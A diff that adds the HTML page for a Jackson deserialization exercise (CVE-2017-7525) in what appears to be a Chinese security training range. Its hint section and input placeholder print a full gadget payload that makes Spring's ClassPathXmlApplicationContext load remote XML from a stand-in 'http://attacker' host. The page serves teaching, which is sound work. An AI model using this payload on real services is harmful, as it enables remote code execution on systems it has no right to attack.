@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>反序列化漏洞靶场 - <span th:text="${vulnName}"></span></title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
+        .header h1 { margin-bottom: 10px; }
+        .header p { opacity: 0.9; }
+        .nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .nav a { padding: 10px 20px; background: white; color: #666; text-decoration: none; border-radius: 5px; transition: all 0.3s; }
+        .nav a:hover, .nav a.active { background: #00f2fe; color: white; }
+        .vuln-info { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .vuln-info h2 { color: #333; margin-bottom: 10px; }
+        .risk-badge { display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .risk-medium { background: #ffbb33; color: white; }
+        .test-area { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .test-area h3 { margin-bottom: 15px; color: #333; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
+        .form-group textarea { width: 100%; min-height: 100px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #00f2fe; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #00cde6; }
+        .hint-section { background: #fff3cd; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .hint-section h3 { color: #856404; margin-bottom: 15px; }
+        .hint-btn { background: #ffc107; color: #333; margin-right: 10px; margin-bottom: 10px; }
+        .hint-content { display: none; background: white; padding: 15px; margin-top: 10px; border-radius: 5px; border-left: 4px solid #ffc107; }
+        .result { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
+        .error { background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 th:text="${vulnName}"></h1>
+            <p th:text="${vulnDesc}"></p>
+        </div>
+
+        <div class="nav">
+            <a href="/">返回首页</a>
+            <a href="/vuln1">Java原生反序列化</a>
+            <a href="/vuln2">Fastjson反序列化</a>
+            <a href="/vuln3">Jackson反序列化</a>
+            <a href="/vuln4">Shiro反序列化</a>
+            <a href="/vuln5">PHP反序列化POP链</a>
+            <a href="/vuln6">PHP Phar反序列化</a>
+        </div>
+
+        <div class="vuln-info">
+            <h2>漏洞信息</h2>
+            <p><strong>描述：</strong> <span th:text="${vulnDesc}"></span></p>
+            <p><strong>危险等级：</strong> <span class="risk-badge risk-medium" th:text="${riskLevel}"></span></p>
+            <p><strong>CVE编号：</strong> CVE-2017-7525</p>
+        </div>
+
+        <div class="test-area">
+            <h3>Jackson反序列化测试区</h3>
+            <div class="form-group">
+                <label>提交JSON数据：</label>
+                <textarea id="payload" placeholder='["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]'></textarea>
+            </div>
+            <button onclick="submitPayload()">提交测试</button>
+            <div id="result" class="result"></div>
+            <div id="error" class="error"></div>
+        </div>
+
+        <div class="hint-section">
+            <h3>提示系统</h3>
+            <button class="hint-btn" onclick="showHint(1)">提示1：漏洞触发条件</button>
+            <button class="hint-btn" onclick="showHint(2)">提示2：利用链</button>
+            <button class="hint-btn" onclick="showHint(3)">提示3：完整Payload</button>
+            
+            <div id="hint1" class="hint-content">
+                <h4>漏洞触发条件</h4>
+                <p>ObjectMapper启用了enableDefaultTyping，且classpath下存在可利用的gadget链</p>
+            </div>
+            
+            <div id="hint2" class="hint-content">
+                <h4>利用链</h4>
+                <p>利用Spring框架的ClassPathXmlApplicationContext加载远程XML文件</p>
+            </div>
+            
+            <div id="hint3" class="hint-content">
+                <h4>完整Payload</h4>
+                <pre><code>["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/poc.xml"]</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showHint(level) {
+            var hint = document.getElementById('hint' + level);
+            if (hint.style.display === 'block') {
+                hint.style.display = 'none';
+            } else {
+                hint.style.display = 'block';
+            }
+        }
+
+        function submitPayload() {
+            var payload = document.getElementById('payload').value;
+            var resultDiv = document.getElementById('result');
+            var errorDiv = document.getElementById('error');
+            
+            fetch('/vuln3/deserialize', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: payload
+            })
+            .then(response => response.text())
+            .then(data => {
+                resultDiv.style.display = 'block';
+                errorDiv.style.display = 'none';
+                resultDiv.textContent = data;
+            })
+            .catch(error => {
+                errorDiv.style.display = 'block';
+                resultDiv.style.display = 'none';
+                errorDiv.textContent = '请求失败: ' + error;
+            });
+        }
+    </script>
+</body>
+</html>
